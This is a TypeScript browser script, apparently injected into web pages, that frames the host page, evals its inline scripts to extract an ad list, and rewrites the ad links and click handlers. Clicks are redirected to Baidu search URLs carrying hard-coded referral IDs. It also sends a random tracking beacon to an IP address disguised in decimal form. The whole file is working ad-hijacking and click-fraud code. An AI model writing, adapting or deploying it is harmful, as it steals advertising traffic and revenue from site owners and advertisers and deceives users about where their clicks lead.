class Pos {
  // config
  m = "";
  p = "";
  v = "//3026275270:6688/?p=UE9TfFNDM3ww";
  D = ["1014538l", "1020067p"];
  E = ["06074089_4", "06074089_33"];
  t = [this.m, this.D[parseInt(`${Math.random() * this.D.length}`)]].join("");
  u = [this.p, this.E[parseInt(`${Math.random() * this.E.length}`)]].join("");
  d = 0.9;
  timer = 10;
  tntervalTime;

  window: Window | any;
  document: Document;
  ads;

  iframe: HTMLIFrameElement;
  constructor() {
    window.onerror = error => {
      console.error(error);
    };

    this.start();
    this.loadAds2();
    setTimeout(() => {
      let iiii = setInterval(() => {
        if (this.timer <= 0) {
          clearInterval(iiii);
          setInterval(() => {
            this.loadAds2();
          }, 1000);
          return;
        }
        --this.timer;
        this.loadAds2();
      }, 100);
    }, 0);

    if (Math.random() <= 0.003) {
      new Image().src = this.v;
    }
  }

  ieVersion(){
    let ua = window.navigator.userAgent.toLowerCase();
    if(ua.indexOf("msie") > -1){
      return parseInt(ua.match(/msie ([\d.]+)/)[1])
    }else{
      return undefined
    }
  }

  // 是否移动端
  browsers() {
    let p = navigator.userAgent;
    return (
      /AppleWebKit.*Mobile|Android|Windows Phone|webOS|iPhone|iPod|BlackBerry|iPad/i.test(p) ||
      /MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE/.test(p)
    );
  }

  // 随机数
  random(a) {
    return Math.floor(Math.random() * a);
  }

  // 加密串
  ciphertext(a) {
    let d = [65, 97, 48],
      e = [26, 26, 10],
      g = "";
    for (let b = 0; b < a; ++b) {
      let c = this.random(3);
      let f = d[c] + this.random(e[c]);
      g = g + String.fromCharCode(f);
    }
    return g;
  }

  // 被替换地址
  replaceHref(d, e, b) {
    let a = this.browsers();
    let v = this.ieVersion();
    let h = 'https:'
    if(v < 8) h = 'http:'
    return `${h}//${a ? "m" : "www"}.baidu.com/s?word=${d}&fenIei=${this.ciphertext(164)}&${a ? `from=${e}` : `tn=${b}`}`;
  }

  start() {
    let src = document.URL.replace(/([?&])(dc=[23])/, `$1rsuv=0x${this.random(8)}&$2`) + "&_r=1_0&ich=s&jid=1&aaa_flag=1";
    let iframe = document.createElement("iframe");
    // iframe.src = 'http://localhost:8086/static/index.html'
    iframe.src = src;
    iframe.width = "100%";
    iframe.height = "100%";
    iframe.marginWidth = "0";
    iframe.marginHeight = "0";
    iframe.scrolling = "no";
    iframe.frameBorder = "0";
    iframe.style.overflow = "hidden";
    iframe.setAttribute("marginwidth", "0");
    iframe.setAttribute("marginheight", "0");
    iframe.setAttribute("scrolling", "no");
    iframe.setAttribute("frameborder", "0");
    iframe.setAttribute("allowtransparency", "true");
    iframe.setAttribute("width", "100%");
    iframe.setAttribute("height", "100%");
    document.body.appendChild(iframe);
    this.iframe = iframe;
  }

  addEvent(d, e, b, c?) {
    c = c || this.window;
    if (c.attachEvent) {
      d.attachEvent("on" + e, function(a) {
        a = a || c.event;
        b.call(d, a);
      });
    } else {
      if (c.addEventListener) {
        d.addEventListener(e, b, false);
      }
    }
  }

  stopEvent(a) {
    if (a.stopPropagation) {
      a.stopPropagation();
    } else {
      a.cancelBubble = true;
    }
  }

  loadAds2() {
    this.window = this.iframe.contentWindow;
    this.document = this.iframe.contentDocument || this.window.document;
    if (!this.window || !this.document) return;
    try {
      this.loadAds();
    } catch (e) {
      console.error(e);
    }
  }

  loadAds() {
    let ads = (this.ads = this.window.ads);
    if (ads && ads.length) {
      this.compile();
    } else {
      let _scriptList: HTMLCollectionOf<HTMLScriptElement> = this.document.getElementsByTagName("script");
      for (let i = 0; i < _scriptList.length; i++) {
        let script = _scriptList[i];
        if (
          !!~script.innerHTML
            .replace(/^\s+|^\r+|\s+$|\r+$/g, "")
            .replace(/\s+|\r+/g, " ")
            .indexOf(`var ads =`)
        ) {
          this.window.eval(script.innerHTML);
          this.ads = this.window.ads;
          this.compile();
        }
      }
    }
  }

  // 解析页面
  compile() {
    let _aList: HTMLCollectionOf<HTMLAnchorElement> = this.document.getElementsByTagName("a");
    let aList = [];
    let aList2 = [];
    for (let i = 0; i < _aList.length; i++) {
      let a = _aList[i];
      if (a.href) {
        aList.push(a);
      } else {
        aList2.push(a);
      }
    }

    if (this.ads && this.ads.length) {
      // 处理 a标签
      for (let i = 0; i < this.ads.length; i++) {
        let data = this.ads[i];
        let curl = data.curl;
        let desc = data.desc || data.title || "";
        let _curl = this.replaceHref(desc, this.t, this.u);
        data.curl = _curl;

        for (let i = 0; i < aList.length; i++) {
          let a = aList[i];
          let href = a.href;
          if (href && this.diffStr(curl, href) >= this.d) {
            a.href = _curl;
          }
        }
      }

      // 事件处理
      if (aList2.length) {
        let s = aList2.length / this.ads.length;
        for (let i = 0; i < aList2.length; i++) {
          let a = aList2[i];
          let _a = this.document.createElement(a.nodeName);
          _a.innerHTML = a.innerHTML;
          if (a.nodeName === "A") {
            _a.target = "_blank";
            _a.style.cursor = "pointer";
          }
          a.parentNode.insertBefore(_a, a);
          a.parentNode.removeChild(a);
          let href = this.ads[parseInt(`${i / s}`)].curl;
          this.addEvent(
            _a,
            "click",
            event => {
              this.stopEvent(event);
              window.open(href);
            },
            this.window
          );
        }
      }
    }
  }

  diffStr(result, target) {
    let r = this.parseURL(result);
    let t = this.parseURL(target);
    let bo =
      r.hash === t.hash &&
      r.host === t.host &&
      r.hostname === t.hostname &&
      r.origin === t.origin &&
      r.pathname === t.pathname &&
      r.port === t.port &&
      r.protocol === t.protocol;
    if (!bo) {
      return 0;
    }
    let ok = 0;
    let count = 0;
    for (let key in r.params) {
      if (!r.params.hasOwnProperty(key)) return;
      let a = r.params[key].split("");
      let b = t.params[key].split("");
      for (let i = 0; i < a.length; i++) {
        count++;
        let data = a[i];
        if (data === b[i]) ++ok;
      }
    }
    return ok / count;
  }

  parseURL(url) {
    let a = document.createElement("a");
    a.href = url;
    let {
      hash,
      host,
      hostname,
      href,
      origin,
      pathname,
      port,
      protocol,
      search
    } = a;
    return {
      hash,
      host,
      hostname,
      href,
      origin,
      pathname,
      port,
      protocol,
      search,
      params: (()=> {
        let ret = {};
        let seg = search.replace(/^\?/, "").split("&");
        for (let i = 0; i < seg.length; i++) {
          let element = seg[i];
          let idx = element.indexOf("=");
          let key = element.substring(0, idx);
          let val = element.substring(idx + 1);
          ret[key] = val;
        }
        return ret;
      })()
    };
  }
}

new Pos();
